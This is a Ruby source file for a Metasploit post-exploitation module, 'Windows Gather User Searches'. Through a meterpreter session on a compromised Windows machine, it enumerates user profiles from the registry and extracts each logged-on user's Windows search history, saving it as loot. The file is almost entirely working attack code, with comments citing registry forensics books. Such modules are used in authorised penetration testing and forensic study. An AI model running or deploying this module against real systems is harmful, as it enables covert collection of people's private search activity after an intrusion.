##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##
require 'msf/core'
require 'rex'
require 'msf/core/post/windows/registry'
class Metasploit3 < Msf::Post

  include Msf::Post::Windows::Priv
  include Msf::Post::Windows::Registry

  def initialize(info={})
    super(update_info(info,
                      'Name'          =>      'Windows Gather User Searches',
                      'Description'   =>       %q{This module gathers information about the recent searches logged on users have made on the system. It users ACMru and ProfileList to find the information.},
                      'License'       =>      MSF_LICENSE,
                      'Author'        =>      ['TJ Glad <fraktaali[at]gmail.com>'],
                      'Platform'      =>      ['win'],
                      'SessionType'   =>      ['meterpreter']
                     ))
  end

  def find_users(table, sysnfo)
    # Function builds registry path and searches for USER_SIDs from it
    # and uses that information to find username using users home directory path.
    # This is not 100% accurate if the username has been changed however most of the time
    # it'll provide the correct username

    reg_path = "HKLM\\Software\\Microsoft\\Windows\ NT\\CurrentVersion\\ProfileList"
    profile_subkeys = registry_enumkeys(reg_path)
    profile_subkeys.each do |user_sid|
      if user_sid.length > 10 and not user_sid.nil?
        users = registry_getvaldata("HKLM\\Software\\Microsoft\\Windows\ NT\\CurrentVersion\\ProfileList\\#{user_sid}", "ProfileImagePath")
        upath = users.split("\\")
        username = "#{upath[-1]}"
        print_status("Search history of user: #{username}")
        find_searches(user_sid, username, table, sysnfo)
      end
    end
  end

  def find_searches(user_sid, username, table, sysnfo)
    # Functions uses USER_SIDs to find searches users have made
    # and saves them to a table

    if sysnfo =~/(Windows XP)/
      hive = "HKU\\"
      subkeys = "\\Software\\Microsoft\\Search\ Assistant\\ACMru"
      full_registry_path = hive + user_sid + subkeys
      search_subkeys = registry_enumkeys(full_registry_path)
      if search_subkeys.nil?
        print_error("User #{username}: Can't get search history. Maybe s/he isn't logged in.")
      else
        search_subkeys.each do |subkeys|
          subkey = full_registry_path + "\\" + "#{subkeys}"
          x = registry_enumvals(subkey)
          if not subkey.nil?
            x.each do |data|
              regkey_search_data = registry_getvaldata(subkey, data)
              search_history = regkey_search_data.to_s
              table << [username,search_history]
          end
        end
      end
    end

      # Not working stable ATM. Has something to do how the registry is accessed by metasploit.
      # If HKU key is closed on its own you'll have to restart whole meterpreter session
      # before you can get any results.

    elsif sysnfo =~/(Windows 7)/
      hive = "HKU\\"
      subkeys = "\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\WordWheelQuery"
      path = hive + user_sid + subkeys
      x = registry_enumvals(path)
      if x.nil?
        print_error("Can't find any results. You'll have to restart the session.")
        return nil
      else
        x.each do |data|
          if data != "MRUListEx"
             regkey_search_data = registry_getvaldata(path, data)
             search_history = regkey_search_data.to_s.delete("\x00")
             table << [username, search_history]
          end
        end
      end
    end


  end

  def run

    # This will show only that a search has been made, not if something has been found or not.

    # Information about ACMru is based on Harlan Carveys "Windows Registry Forensics" and
    # "Windows Forensic Analysis Toolkit"-books and information from his blog at
    # http://windowsir.blogspot.com

    table = Rex::Ui::Text::Table.new(
      'Header'  => "Searches made using Windows Search",
      'Indent'  => 1,
      'Columns' =>
      [
        "Username",
        "Searches made by user",
      ])

    sysnfo = client.sys.config.sysinfo['OS']

    print_status("Running search enumeration on #{sysnfo}.")
    print_status("This will gather only searches from users currently logged on to the system.")
    print_status("Searches are presented from the most recent to the last per user.\n")

    # Function that runs everything else
    find_users(table, sysnfo)
    # Modifying, storing and presenting the results
    results = table.to_s.delete("\x00")
    loot = store_loot("user_searches", "text/plain", session, results, nil, "User Search Information")
    print_line("\n" + results + "\n")
    print_status("Results stored in: #{loot}")
    print_good("Finished gathering searches.")
  end
end
